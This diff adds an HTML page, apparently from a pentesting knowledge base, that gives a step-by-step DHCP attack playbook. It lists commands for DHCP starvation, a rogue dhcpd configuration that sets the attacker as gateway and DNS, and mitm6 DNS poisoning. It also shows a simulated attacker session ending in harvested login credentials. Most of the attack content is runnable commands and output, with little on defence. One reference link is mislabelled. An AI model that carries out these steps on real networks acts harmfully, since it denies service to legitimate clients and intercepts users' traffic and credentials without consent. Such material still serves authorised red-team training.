@@ -1,0 +1,186 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">DHCP Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>Network Security</strong> • Focus: <strong>DHCP Attacks & Rogue Services</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    DHCP (Dynamic Host Configuration Protocol) automatically assigns IP addresses and 
+    network parameters to clients. Attackers exploit DHCP through starvation attacks, 
+    rogue DHCP servers, and malicious option injection (e.g., default gateway or DNS redirection). 
+    By manipulating DHCP traffic, adversaries can launch man-in-the-middle attacks, 
+    intercept communications, and pivot deeper into the network.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>Unauthenticated Protocol:</strong> DHCP lacks authentication, any host can send offers/acks.</li>
+    <li><strong>Broadcast-Based:</strong> Easy to poison or spoof responses to clients.</li>
+    <li><strong>Exhaustion Attacks:</strong> DHCP pools can be starved with fake requests.</li>
+    <li><strong>Option Abuse:</strong> Malicious gateways, DNS, or WPAD options can redirect traffic.</li>
+    <li><strong>Poor Monitoring:</strong> DHCP exploitation often goes unnoticed in corporate environments.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>DHCP Starvation:</strong> Attacker floods requests to exhaust the IP pool.</li>
+    <li><strong>Rogue DHCP Server:</strong> Attacker runs a fake DHCP server, assigning malicious configs.</li>
+    <li><strong>Man-in-the-Middle:</strong> Victims receive attacker-controlled gateway/DNS options.</li>
+    <li><strong>Persistence:</strong> Redirection enables credential theft, phishing, or traffic interception.</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan and sniff network for DHCP traffic.</li>
+    <li>Perform DHCP starvation to exhaust legitimate server’s IP pool.</li>
+    <li>Launch rogue DHCP server and respond to client requests faster than the real server.</li>
+    <li>Inject malicious options (e.g., attacker gateway, DNS) to intercept traffic.</li>
+    <li>Harvest credentials, reroute traffic, or pivot for further exploitation.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery & Sniffing
+# ------------------------------
+tcpdump -i eth0 port 67 or port 68        # Capture DHCP traffic
+wireshark (filter: bootp)                 # Analyze DHCP handshake
+
+# ------------------------------
+# DHCP Starvation Attack
+# ------------------------------
+yersinia -I                               # Interactive mode, choose DHCP starvation
+dhcpstarv -i eth0                         # Example starvation tool
+
+# ------------------------------
+# Rogue DHCP Server (mitm6 / dhcpd)
+# ------------------------------
+dhcpd -cf /etc/dhcp/dhcpd.conf eth0       # Start rogue DHCP server
+mitm6 -d corp.local                       # Respond to DHCPv6 with malicious DNS/WPAD
+
+# ------------------------------
+# Example dhcpd.conf for Rogue DHCP
+# ------------------------------
+subnet 192.168.1.0 netmask 255.255.255.0 {
+  range 192.168.1.100 192.168.1.200;
+  option routers 192.168.1.50;            # Attacker as gateway
+  option domain-name-servers 192.168.1.50; # Attacker as DNS
+}
+
+# ------------------------------
+# Example Workflow
+# ------------------------------
+tcpdump -i eth0 port 67 or port 68         # Monitor DHCP traffic
+dhcpstarv -i eth0                          # Exhaust IP pool of real server
+dhcpd -cf rogue_dhcp.conf eth0             # Launch rogue DHCP server
+mitm6 -d corp.local                        # Poison DNS and redirect traffic
+  </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ tcpdump -i eth0 port 67 or port 68
+12:10:12 DHCPDISCOVER from 00:0c:29:aa:bb:cc via eth0
+12:10:12 DHCPOFFER from 192.168.1.1
+12:10:13 DHCPREQUEST for 192.168.1.50 from 00:0c:29:aa:bb:cc
+12:10:13 DHCPACK from 192.168.1.1
+
+[ saide ~ ]$ dhcpstarv -i eth0
+[*] Flooding DHCP server with fake requests...
+[*] Pool exhausted — legitimate clients denied service
+
+[ saide ~ ]$ dhcpd -cf rogue_dhcp.conf eth0
+Listening on LPF/eth0/aa:bb:cc:dd:ee:ff/192.168.1.0
+Sending DHCPOFFER to 192.168.1.101
+Assigned router: 192.168.1.50 (attacker)
+
+[ saide ~ ]$ mitm6 -d corp.local
+[*] Listening for DHCPv6 requests
+[*] Injecting fake DNS (attacker-controlled)
+[*] Victims resolving hostnames via attacker DNS
+
+[ saide ~ ]$ tcpdump -i eth0 port 53
+Victim queries: 
+    A record for "intranet.corp.local"
+    Attacker responds with: 192.168.1.50
+
+[ saide ~ ]$ # Credentials intercepted via phishing page
+POST /login.php HTTP/1.1
+username=jsmith&password=Spring2025!
+    </pre>
+  </details>
+</section>
+
+<!-- Example Results -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to view sample DHCP exploitation results
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+# DHCP Starvation Outcome
+[+] Legitimate DHCP server exhausted — clients unable to obtain leases
+
+# Rogue DHCP Server Assignments
+IP: 192.168.1.150
+Gateway: 192.168.1.50 (attacker)
+DNS: 192.168.1.50 (attacker)
+
+# Victim Behavior
+> All traffic routed through attacker
+> DNS queries resolved by attacker DNS
+> User credentials harvested via MITM phishing site
+
+# Proof
+username=jsmith
+password=Spring2025!
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-dhcp" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting DHCP
+      </a>
+    </li>
+    <li>
+      <a href="https://attack.mitre.org/techniques/T1205/" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        MITRE ATT&CK – Rogue DHCP & Network Service Exploitation
+      </a>
+    </li>
+    <li>Common in Red Team ops: DHCP starvation + rogue server → credential interception.</li>
+  </ul>
+</section>
